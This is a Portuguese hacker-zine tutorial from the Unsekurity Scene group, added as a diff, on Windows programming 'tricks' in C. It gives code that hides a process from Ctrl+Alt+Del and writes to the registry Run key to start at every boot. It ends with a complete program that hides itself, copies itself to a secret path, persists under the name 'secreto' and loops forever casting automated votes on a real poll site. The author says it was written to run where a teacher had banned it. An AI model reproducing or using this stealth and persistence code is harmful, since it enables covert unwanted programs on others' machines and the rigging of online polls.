@@ -1,0 +1,527 @@
+**********************************************
+*                                            *
+*             UNSEKURITY SCENE               *
+*                                            *
+**********************************************
+
+Behind The Scene:
+
+
+*              'Truques' de programacao para Windows.                *
+
+
+
+1. Introducao.
+2. Como esconder um programa do ctrl + alt + del ?
+3. Como fazer o programa ser executado a cada inicializacao ?
+  3.1 WINAPI: Usando o registro do windows
+4. Utilizacao pratica.
+5. Finalizacao.
+
+
+1. Introducao
+
+Consegui um tempinho para escrever mais um pequeno texto.. esse texto
+sera publicado no site da Unsekurity Scene, que cresceu muito nos ultimos
+tempos; tudo gracas a MUITAS pessoas eticas que fazem parte da comunidade.
+Espero que a Unsekurity Scene cresca cada vez mais e atinja niveis mundiais
+(ja esta chegando nesse ponto :), e talvez, em breve, se torne possivel
+fazer encontros de confraternizacao, troca de informacao e etc :)
+A Scene esta, atualmente, passando por algumas transformacoes..
+estamos novamente com o nosso canal no irc, a maillist esta nota 10, e
+em breve o forum, talvez, voltara a ativa :)
+A liberdade da informacao, tanto etica como tecnica, sera levada pela
+Comunidade do Unsekurity a todos, e ninguem podera nos parar!
+Todos sao livres para participar da Comunidade do Unsekurity, tanto
+via MailList, canal de IRC ou forum.
+Nao sao bem vindos os anti-eticos, egocentricos, etc...(Script Kiddies,
+Defacers, Crackers, etc).
+O publico alvo desse texto sao os eticos.
+Se voce tem alguma influencia na midia, opiniao publica de algum
+grupo ou numa comunidade(principalmente algumas empresas, analistas
+de 'seguranca', donos de WebSites que mantem comunidades virtuais
+ou de noticias, forums e etc...); e usa essa influencia de uma
+forma errada(enganando, visando apenas o beneficio proprio, etc);
+voce sera derrubado.
+Aqui nao eh o lugar adequado para citar nomes
+ou apontar alguem ou alguma empresa, mas, atualmente, um provedor de internet
+que da assistencia em 'seguranca' disponibiliza 'receitas de bolo'
+incentivando as pessoas a fazerem DEFACE. Essa mesma empresa mantem
+um mirror de defaces, e usa os defaces como principal propaganda(ou seja,
+esse provedor esta usando/manipulando as criancas que fazem deface),
+esse mesmo provedor tambem 'explora' uma palavra muito explorada pela
+midia e imprensa.. eh a palavra 'hacker', essa empresa, inclusive, tem
+registrado o dominio com essa palavra no brasil.
+Este pequeno texto explica alguns 'truques' de programacao no windows.
+Todos exemplos deste texto sao na linguagem C.
+Os exemplos nesse texto foram testados no lcc(http://www.cs.virginia.edu/~lcc-win32/).
+Nao se esqueca de configurar o lcc para compilar um programa Windows appl.
+
+
+
+2. Como esconder um programa do ctrl + alt + del ?
+
+Uma solucao simples para esconder o programa do ctrlaltdel eh transformar
+o programa em um 'service', o windows nao vai mostrar o seu programa no
+ctrlaltdel pq ele nao pode ser killado(pois agora ele vai ser classificado como service).
+usaremos a funcao REgisterServiceProcess()
+se voce consultar a ajuda do winapi(tem no site da microsoft) encontrara isso:
+
+
+[quote]
+The RegisterServiceProcess function registers or unregisters a service process.
+A service process continues to run after the user logs off. 
+
+DWORD RegisterServiceProcess(DWORD dwProcessId, 
+    DWORD dwType);
+
+Parameters
+
+dwProcessId
+
+Specifies the identifier of the process to register as a service process.
+Specifies NULL to register the current process. 
+
+dwType
+
+Specifies whether the service is to be registered or unregistered.
+This parameter can be one of the following values. 
+
+Value	Meaning
+RSP_SIMPLE_SERVICE	Registers the process as a service process.
+RSP_UNREGISTER_SERVICE	Unregisters the process as a service process.
+Return Value
+
+The return value is 1 if successful or 0 if an error occurs.
+[/quote]
+
+
+A funcao RegisterServiceProcess se encontra no kernel32.dll,
+precisamos carregar o kernel32.dll e usar o RegisterServiceProcess. 
+
+Peguei na net uma funcao prontinha que faz todo o trabalho :)
+
+void hide(){
+  HMODULE hmod;
+  int *(*pReg)(); /* esse eh o pointer em que sera armazenado o endereco da funcao */
+
+ /* carrega-se o kernel32.dll */
+  hmod = LoadLibrary("kernel32.dll"); 
+  if (!hmod) return;
+
+ /* procura-se pelo RegisterServiceProcess dentro do kernel32.dll */
+  pReg = GetProcAddress(hmod,"RegisterServiceProcess");
+  if (!pReg) { /* se nao encontrar, retorna */
+     FreeLibrary(hmod); 
+     return;
+  }
+  else /* faz com que o processo atual se torne um service :) */
+    pReg(NULL, RSP_SIMPLE_SERVICE);
+ 
+  FreeLibrary(hmod);
+  return;
+}
+
+
+
+3. Como fazer o programa ser executado a cada inicializacao ?
+
+Um jeito simples de fazer isso eh colocar um atalho para o programa no
+menu iniciar->programas->iniciar.
+Mas se voce nao quer usar o menu iniciar, voce pode colocar no registro
+do windows :)
+
+Abra o regedit, abra a chave HKEY_LOCAL_MACHINE, va em Software,
+Microsoft, Windows, CurrentVersion, Run.
+Adicione nessa chave um valor do tipo string; com qualquer nome, e com
+o valor como o endereco do arquivo a ser executado.
+dependendo da versao do seu wdinws vc pode encontrar um SystemTray,
+ai , como exemplo :)
+
+
+
+3.1 WINAPI: Usando o registro do windows
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Run sera
+a chave a ser usada no nosso exemplo.
+usaremos as funcoes RegOpenKeyEx(), RegSetValueEx(), RegFlushKey()
+e RegCloseKey() da WINAPI.
+
+
+[quote]
+The RegOpenKeyEx function opens the specified key. 
+
+LONG RegOpenKeyEx(HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions,
+                                         REGSAM samDesired,  PHKEY phkResult  );
+Parameters
+
+hKey
+
+Identifies a currently open key or any of the following predefined reserved handle values: 
+
+HKEY_CLASSES_ROOT
+HKEY_CURRENT_USER
+HKEY_LOCAL_MACHINE
+HKEY_USERS
+
+lpSubKey
+
+Points to a null-terminated string containing the name of the subkey to open.
+If this parameter is NULL or a pointer to an empty string, the function will open
+a new handle of the key identified by the hKey parameter. In this case,
+the function will not close the handles previously opened. 
+
+ulOptions
+
+Reserved; must be zero. 
+
+samDesired
+
+Specifies an access mask that describes the desired security access for the new key.
+This parameter can be a combination of the following values: 
+
+Value	Meaning
+KEY_ALL_ACCESS   Combination of KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS, 
+                                                  KEY_NOTIFY, KEY_CREATE_SUB_KEY, KEY_CREATE_LINK,
+                                                  and KEY_SET_VALUE access.
+KEY_CREATE_LINK	Permission to create a symbolic link.
+KEY_CREATE_SUB_KEY	Permission to create subkeys.
+KEY_ENUMERATE_SUB_KEYS	Permission to enumerate subkeys.
+KEY_EXECUTE	Permission for read access.
+KEY_NOTIFY	Permission for change notification.
+KEY_QUERY_VALUE	Permission to query subkey data.
+KEY_READ      Combination of KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS,
+                                                            and KEY_NOTIFY access.
+KEY_SET_VALUE	Permission to set subkey data.
+KEY_WRITE	Combination of KEY_SET_VALUE and KEY_CREATE_SUB_KEY access.
+phkResult
+
+Points to a variable that receives the handle of the opened key. 
+[/quote]
+
+
+[quote]
+The RegSetValueEx function stores data in the value field of an open registry key.
+It can also set additional value and type information for the specified key. 
+
+LONG RegSetValueEx( HKEY hKey,	 LPCTSTR lpValueName, DWORD Reserved,	
+                                         DWORD dwType, CONST BYTE *lpData, DWORD cbData );
+
+Parameters
+
+hKey
+
+Identifies a currently open key or any of the following predefined reserved handle values: 
+
+HKEY_CLASSES_ROOT
+HKEY_CURRENT_USER
+HKEY_LOCAL_MACHINE
+HKEY_USERS
+
+lpValueName
+
+Points to a string containing the name of the value to set.
+If a value with this name is not already present in the key, the function adds it to the key. 
+
+Reserved
+
+Reserved; must be zero. 
+
+dwType
+
+Specifies the type of information to be stored as the value's data.
+This parameter can be one of the following values: 
+
+Value	Meaning
+REG_BINARY	Binary data in any form.
+REG_DWORD	A 32-bit number.
+(....)
+REG_RESOURCE_LIST	A device-driver resource list.
+REG_SZ:
+A null-terminated string. It will be a Unicode or ANSI string depending on whether
+you use the Unicode or ANSI functions.
+
+lpData
+
+Points to a buffer containing the data to be stored with the specified value name. 
+
+cbData
+
+Specifies the size, in bytes, of the information pointed to by the lpData parameter.
+If the data is of type REG_SZ, REG_EXPAND_SZ, or REG_MULTI_SZ,
+cbData must include the size of the terminating null character.
+[/quote]
+
+
+bom, vamos ver cada argumento dessas funcoes.
+
+
+LONG RegOpenKeyEx(HKEY hKey, LPCTSTR lpSubKey, DWORD ulOptions,
+                                         REGSAM samDesired,  PHKEY phkResult  );
+
+o argumento HKEY hKey vai ser o nome da chave principal do registro, no nosso caso
+sera HKEY_LOCAL_MACHINE.
+
+LPCTSTR lpSubKey eh a string da subchave, aqui sera
+"SOFTWARE\\Microsoft\\Windows\\Run".
+
+DWORD ulOptions eh reservado e eh 0.
+
+REGSAM samDesired sera o tipo de acesso a chave.
+aqui nos usaremos KEY_ALL_ACCESS.
+
+PHKEY phkResult, aqui vai o endereco da variavel que armazenara as informacoes da
+chave aberta.
+
+
+
+
+LONG RegSetValueEx( HKEY hKey,	 LPCTSTR lpValueName, DWORD Reserved,	
+                                         DWORD dwType, CONST BYTE *lpData, DWORD cbData );
+
+HKEY hKey sera a variavel que usamos no RegOpenKeyEx na qual foi armazenada
+as informacoes sobre a chave aberta.
+
+LPCTSTR lpValueName eh a string do nome do valor a ser adicionado no registro.
+
+DWORD Reserved, reservado, 0.
+
+DWORD dwType especifica o tipo de valor a ser adicionado no registro,
+no nosso caso sera uma string. REG_SZ.
+
+CONST BYTE *lpData sera a string do valor a ser adicionado no registro.
+
+DWORD cbData eh o tamanho da string(contando com o \0 final)
+
+
+
+a funcao RegFlushKey(HKEY hKey) atualiza a chave no registro.
+a funcao RegCloseKey(HKEY hKey) fecha a chave.
+
+
+agora vamos ver um pequeno programa que adiciona um valor no registro.
+
+#include <windows.h>
+#include <winreg.h>
+
+int API WinMain(HINSTANCE hInst, HINSTANCE hPrevInst,
+                                LPSTR lpszCmdLine, int nCmdShow)
+{
+  PHKEY pa;
+
+ /* aqui abrimos a chave */
+  RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+                              "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+                               KEY_ALL_ACCESS, &pa);
+
+/* adicionamos o valor */
+  RegSetValueEx(pa ,"testando", 0,  REG_SZ, "teste", 6 );
+
+/* atualizamos e fechamos a chave */
+  RegFlushKey(pa);
+  RegCloseKey(pa);
+
+  return 0;
+}
+
+compile o programinha, abra o regedit e verifique se algo mudou :)
+
+
+
+4. Utilizacao pratica.
+
+Mostrarei uma pequena aplicacao utilizando o que aprendemos neste texto.
+Ha algum tempo, uns colegas me pediram para fazer um programa que votasse automaticamente
+no Bush no site maladomes... hehehehe. Depois de pronto o programa, meus amigos reclamaram
+que a professora de informatica nao deixava rodar o programa nos computadores do colegio...
+E agora estou escrevendo esse texto contando o que eu aprendi nessa historia :)
+
+E agora usaremos o programinha de votacao como exemplo.
+
+
+<corte>
+/*
+ * Programa simples para votacao no site maladomes.com.br
+ * Feito por hts.
+*/
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <winreg.h>
+
+#define SA struct sockaddr
+#define SI struct sockaddr_in
+/* ip do site maladomes */
+#define IP "200.225.179.243"
+/* header de um pedido http*/
+#define HOST "Accept: image/gif, image/x-xbitmap,image/jpeg, \
+image/pjpeg, application/vnd.ms-excelapplication/msword,*/*\r\nReferer: \
+http://www.maladomes.com.br/ranking.phtml\r\nAccept-Language: \
+pt-br\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/4.0 \
+(compatible; MSIE 5.5; Windows 98; Win 9x 4.90)\r\nHost: \
+www.maladomes.com.br\r\nConnection: Keep-Alive\r\n\r\n"
+
+#define bzero(a, b) memset(a, 0, b)
+
+char *http(char *, char *);
+int Socket(int, int, int);
+char *Malloc(unsigned int);
+void hide();
+void doit();
+
+/* Essa funcao se conecta e pega a pagina */
+char *httpget(char *ip, char *target){
+  int sock, count;
+  SI server;
+  char c, *ret, *ptr;
+  FILE *sv;
+  WORD wVersion;
+  WSADATA wStart;
+
+  bzero((void *)&server, sizeof(SI));
+  server.sin_family = AF_INET;
+  server.sin_port = htons(80);
+  server.sin_addr.s_addr = inet_addr(IP);
+  wVersion = MAKEWORD(2, 0);
+  if(WSAStartup(wVersion,&wStart) != 0) {
+   exit(-1);
+  }
+
+  sock = Socket(AF_INET, SOCK_STREAM, 0);
+
+  if((connect(sock, (SA *)&server, sizeof(SA)))<0){
+	sleep(2*30*1000);
+	return NULL;
+  }
+
+  send(sock, "GET ", 4, 0);
+  send(sock, target, strlen(target), 0);
+  send(sock, " HTTP/1.0\r\n", 10, 0);
+  send(sock, HOST, strlen(HOST), 0);
+
+  sv = fopen("./tmp", "w");
+  while(recv(sock, &c, 1, 0))
+    fputc(c, sv);
+  fclose(sv);
+  closesocket(sock);
+  WSACleanup();
+
+  sv = fopen("./tmp", "r");
+  for(count = 0;!feof(sv);count++, fgetc(sv));
+  rewind(sv);
+  ptr = ret = Malloc(count);
+  while(--count)
+    *ptr++=fgetc(sv);
+  fclose(sv);
+
+  return ret;
+}
+
+int Socket(int family, int  type, int s){
+  int ret;
+
+  ret = socket(family, type, s);
+  if( ret < 0 ){
+    exit(-1);
+  }
+  return ret;
+}
+
+char *Malloc(unsigned int size){
+  char *ret;
+
+  ret = malloc(size);
+  if( !ret ){
+    fprintf(stderr, "out of memory\n");
+    exit(-1);
+  }
+  bzero(ret, size);
+
+  return ret;
+}
+
+/* nossa funcao que esconde o programa do ctlaltdel*/
+void hide()
+{
+  HMODULE hmod;
+  int *(*pReg)();
+
+  hmod = LoadLibrary("kernel32.dll");
+  if (!hmod) return;
+
+  pReg = GetProcAddress(hmod,"RegisterServiceProcess");
+  if (!pReg) {
+     FreeLibrary(hmod);
+     return ;
+  }
+  else
+    pReg(NULL, RSP_SIMPLE_SERVICE);
+  FreeLibrary(hmod);
+
+  return ;
+}
+
+/* essa funcao faz o trabalho principal */
+void doit(){
+  char *ptr, votos = 0;
+
+  while(1){
+    ptr = httpget(IP, "/voto.phtml?nome=GEORGE_W._BUSH&categoria=8");
+	if(ptr){
+      if(strstr(ptr, "espere.phtml")){
+      sleep(5*15*1000);
+/*
+ * a cada 2 minutos e meio ela tenta votar, se o tempo minimo do site nao tiver passado
+ * espera mais 2 minutos e meio.
+*/
+      }
+      free(ptr);
+    }
+  }
+  return;
+}
+
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpszCmdLine, int nCmdShow)
+{
+  PHKEY pa;
+
+  hide(); /* esconde o programa do ctrlaltdel*/
+
+  RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+  KEY_ALL_ACCESS, &pa);
+  RegSetValueEx(pa ,"secreto", 0, REG_SZ, "C:\\escondido.exe", 17 );
+  RegFlushKey(pa);
+  RegCloseKey(pa);
+  /* grava o programa no registro para rodar o programa toda inicializacao */
+
+  CopyFile("./mala.exe", "C:\\escondido.exe", TRUE);
+  /* copia o executavel do programa */
+
+  doit(); /* loop principal */
+  return 0;
+}
+<corte>
+
+
+
+5. Finalizacao.
+
+Termino aqui este pequeno texto.
+Envie qualquer erro, sugestao ou critica para a MailList da Unsekurity Scene.
+
+
+Referencias:
+Site do Unsekurity - http://www.unsekurity.com.br
+Site do LCC - http://www.cs.virginia.edu/~lcc-win32 (contem o WINAPI Help para download)
+Site da Microsoft - http://www.microsoft.com
+
+
+Anti-eticos serao descobertos e derrubados.
+
+Obrigado,
+hts<plex15@linuxbr.com.br>.
+
+http://mind.obsc.urity.org/
+
